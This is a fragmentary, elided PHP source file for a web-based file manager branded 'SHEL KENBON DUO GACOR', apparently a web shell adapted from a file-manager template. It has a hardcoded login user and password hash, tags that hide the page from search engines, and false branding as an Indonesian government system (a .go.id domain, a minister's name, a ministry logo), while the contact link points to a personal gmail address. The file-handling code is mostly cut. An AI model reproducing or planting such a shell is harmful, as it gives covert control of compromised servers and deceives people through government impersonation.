...
/**
 * System | File Manager KENBON
 * @author KENBON @2023
 * @email kontak@KENBON.go.id
 * @MenKENBON Budi Arie Setiadi
 * @link https://www.KENBON.go.id/
 */
...
//Application Title
define('APP_TITLE', 'SHEL KENBON DUO GACOR');
...
$use_auth = true;
$auth_users = array(
    'kenbon88' => '$2y$10$lm1.pM9ZCuKda/FvjlFdhureWpfO1PAVYLf5yYwkSV8iKrmsoIFcK', 
);
...
// sample config - https://www.KENBON.go.id/
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://www.KENBON.go.id" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">L4yn.ID</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://www.KENBON.go.id/" target="_blank" class="app-v-title"> File Manager KENBON <?php echo VERSION; ?></a></h3></p>
                        <p>Budi Arie Setiadi</p>
                        <p>Mail Us: <a href="mailto:gmakarim7@gmail.com">kontak[at]KENBON.go.id</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://www.KENBON.go.id/" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://www.KENBON.go.id/" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://www.KENBON.go.id/" target="_blank" class="float-right text-muted">File Manager KENBON <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://www.KENBON.go.id/" target="_blank" class="float-right text-muted">File Manager KENBON <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'File Manager KENBON<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="Web Based System Pemerintah, SHEL KENBON DUO GACOR,Pemilik Negara">
    <meta name="author" content="KENBON @2023">
    ...
    <style>
        body.fm-login-page{ background-image: url('https://3.bp.blogspot.com/-8x2TVAhbOA0/Xu1QTDcvtZI/AAAAAAAAaUI/2y50LmTIodEMjQgGabnmoAP0Su696nPJwCLcBGAsYHQ/s1600/kemKENBON-logo_fea_237design.jpg');background-repeat: no-repeat;background-position: center center;background-size: cover;}
...
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="System | File Manager KENBON">
    <meta name="author" content="KENBON @2023">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'File Manager KENBON';      $tr['en']['AppTitle']           = 'File Manager';
